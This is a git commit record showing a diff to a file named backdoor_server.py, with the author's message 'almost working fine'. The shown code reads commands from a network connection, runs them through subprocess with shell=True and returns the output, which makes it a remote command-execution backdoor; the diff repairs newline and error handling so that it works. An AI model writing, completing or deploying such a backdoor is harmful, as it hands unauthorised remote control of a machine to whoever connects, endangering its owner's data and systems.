338cc47a35cafa1440c4925627a704b83631cbf8
Antonio Pons <toninopons@gmail.com>
2020-04-24 14:01:47 +0200

    almost working fine

--- backdoor_server.py
+++ backdoor_server.py
@@ -16,10 +16,10 @@ while True:
 	try:
 		data = connection.recv(1024)
 		data = data.decode('utf-8')
-		print(data)
 		data = data.split(" ")
+		data[-1] = data[-1].replace("\n", "")
 		command_response = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		command_response = str(command_response.stdout.read()) + " " + str(command_response.stderr.read())
 		connection.send(command_response.encode())
-	except KeyboardInterrupt:
-        	continue
+	except Exception:
+        	break
